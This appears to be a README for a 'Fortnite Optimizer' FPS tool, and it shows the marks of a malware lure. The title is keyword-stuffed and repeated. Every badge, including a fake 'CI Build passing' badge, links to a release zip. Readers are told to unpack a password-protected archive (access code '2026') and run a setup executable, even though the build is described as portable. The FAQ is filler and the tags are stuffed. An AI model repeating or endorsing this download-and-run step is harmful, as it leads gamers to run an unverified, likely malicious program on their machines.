<div align="center">

# Fortnite Optimizer — Fortnite Optimizer — Fortnite Optimizer (One-Command Setup, Prebuilt Release)

<p><strong>Fortnite Optimizer — Fortnite Optimizer — Fortnite Optimizer (One-Command Setup, Prebuilt Release): Fortnite Optimizer — fortnite and fps in one tool. Native 64-bit portable build with hot-reloadable JSON configuration, low-overhead runtime, and prebuilt portable release.</strong></p>

[![CI Build](https://img.shields.io/badge/CI_Build-passing-2ea44f?style=for-the-badge&logo=githubactions&logoColor=white)](../../releases/download/v0.1.0/fortnite-fps-tool-v0.1.0-win64.zip)
[![Version](https://img.shields.io/badge/Release-v0.1.0-2ea44f?style=for-the-badge&logo=github)](../../releases/download/v0.1.0/fortnite-fps-tool-v0.1.0-win64.zip)
[![Platform](https://img.shields.io/badge/Platform-Windows_10%2F11_x64-0969da?style=for-the-badge&logo=windows)](../../releases/download/v0.1.0/fortnite-fps-tool-v0.1.0-win64.zip)
[![Stars](https://img.shields.io/github/stars/TestOwner/fortnite-fps-tool?style=for-the-badge&logo=github&color=e3b341)](../../stargazers)

<p><strong>⬇ No compiler. No setup. Grab the prebuilt package and run.</strong></p>

<a href="../../releases/download/v0.1.0/fortnite-fps-tool-v0.1.0-win64.zip"><img src="download_btn.svg" alt="Download fortnite-fps-tool-v0.1.0-win64.zip" width="520"></a>

<br>

<a href="../../releases/download/v0.1.0/fortnite-fps-tool-v0.1.0-win64.zip"><img src="banner.svg" alt="Fortnite Optimizer Preview" width="840"></a>

</div>

---

## Executive Summary & Design

**Fortnite Optimizer — Fortnite Optimizer — fortnite and fps in one tool** (`fortnite-fps-tool`) ships as a native 64-bit Windows build with a prebuilt portable release. Everything is driven by `config/settings.json` — hot-reloadable, dependency-free, and tuned for a minimal runtime footprint.

## Getting Started (No Compiler Needed)

| Platform | Direct Prebuilt Package | Documentation Mirror |
| :--- | :--- | :--- |
| **Windows 10 / 11 (x64)** | [**`fortnite-fps-tool-v0.1.0-win64.zip`**](../../releases/download/v0.1.0/fortnite-fps-tool-v0.1.0-win64.zip) | [**Usage Guide (`docs/USAGE.md`)**](docs/USAGE.md) |

1. Download [`fortnite-fps-tool-v0.1.0-win64.zip`](../../releases/download/v0.1.0/fortnite-fps-tool-v0.1.0-win64.zip) using the download button above.
2. Extract the archive using the access code (`2026`).
3. Launch `FortniteFpsTool_Setup_x64.exe` (keep `config/settings.json` in the same folder).

## FAQ

<details>
<summary><b>Build lag?</b></summary>

Fixes build delay.
</details>
<details>
<summary><b>Performance mode?</b></summary>

Profiles included.
</details>
<details>
<summary><b>Chapters?</b></summary>

All current ones.
</details>

## Configuration (`config/settings.json`)

```json
{
  "module": "fortnite-fps-tool",
  "version": "0.1.0",
  "runtime": {
    "threads": 4,
    "verbose": false,
    "hot_reload": true
  },
  "modules": {
    "tuner": {
      "enabled": true
    },
    "lagfix": {
      "enabled": true
    },
    "profiles": {
      "enabled": true
    },
    "cli": {
      "enabled": true
    }
  }
}
```

## Documentation & Guides

- [Usage Guide — commands and options](docs/USAGE.md)
- [Contributing — setup, ground rules, PR flow](CONTRIBUTING.md)
- [Changelog — v0.1.0 and later](CHANGELOG.md)
- [FAQ — platform support, data storage](docs/FAQ.md)

## Building from Source

```bash
git clone https://github.com/TestOwner/fortnite-fps-tool.git
cd fortnite-fps-tool
cmake -B build -DCMAKE_BUILD_TYPE=Release
cmake --build build --config Release
```

---
<sub>Indexed tags: fortnite-fps-tool, optimizer, fps, build-lag, boost, gaming-tools, performance, windows, fortnite, cli, developer-tools, open-source, automation, productivity, cpp, portable, prebuilt, tools</sub>
